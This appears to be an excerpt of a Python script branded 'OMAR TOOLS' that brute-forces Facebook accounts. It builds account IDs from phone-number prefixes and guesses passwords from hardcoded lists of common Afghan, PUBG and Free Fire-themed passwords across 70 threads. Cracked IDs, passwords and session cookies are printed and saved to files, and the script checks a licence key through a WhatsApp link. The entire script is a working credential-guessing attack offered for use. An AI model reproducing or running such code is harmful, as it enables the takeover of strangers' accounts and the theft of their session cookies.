...
print('\n\033[1;37m INSTALLING OMAR TOOLS ......')
print('\n\033[1;37m plz wait  ......')
import uuid
...
\033[1;92m[+] GITHUB    :  OMAR JANN007
\033[1;92m[+] FACEBOOK  :  OMar JaNn
\033[1;92m[+] WHATSAPP  :  +93728718240
\033[1;92m[+] TELEGRAM :  +93728718240
\033[1;92m[+] TOOLS     :  Trial
\033[1;92m[+] VERSION   :  0.00
\033[1;90m══════════════════════════════════════════════════════════════════════""")
...
def riaz():
	...
	print('[3] FOLLOW OMAR FACEBOOk')
	#print('[4] FOLLOW PARTNER FACEBOOk ')
	...
	if riaz1 =='4':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100000746223230')
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100000746223230');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def annu():
    os.system('clear')
    print(logo)
    print('[1] RANDOM M 1[UPDATE]')
   # print('\x1b[1;97m[2] RANDOM M 2[UPDATE]')
    #print('\x1b[1;97m[3] RANDOM M 3')
    lines()
    lines()
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[✓] Example  : 9378,9379,9377,9370')
    print('\x1b[1;92m[✓]MRx : PUT YOUR SIM CODE ')
    lines()
    ...
    print('\x1b[1;92m[MRx] See Note : PUT LEMIT ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰','Afghan1234','kabul1234','Kabul123','Kabul1234']
...
def m2():
    ...
    print('\x1b[1;92m[] See Note : PUT LEMIT ')
    lines()
    limit = int(input('[✓] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰','Afghan1234','kabul1234','Kabul123','Kabul1234']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','pubgpubg','789789','786786','khankhan','khan1122','khan12','khan123','khan786''pubgqueen','pubgking','pubglover','freefire','fflover','ffking','ffqueen']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    print('\x1b[1;91m[✓] See Note : PUT YOUR SIM CODE ')
    lines()
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97mOMAR\033[1;97m] %s|\33[1;32mJANAN:- %s \r'%(loop,len(oks)));sys.stdout.flush()
    ...
    'viewport-width': '980',
           ...
           # print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[OMAR-OK] '+cid+' | '+ps+'\n [COOKIE🍪] = \33[1;36m'+coki+'\033[0;97m')
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Afghanhacker420%20!%20🄿lease%20🄰pprove%20🄼y%20🄺ey%20🅃he%20🄺ey%20Is%20:%20'+id);os.system('am start https://wa.me/+93764034195?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
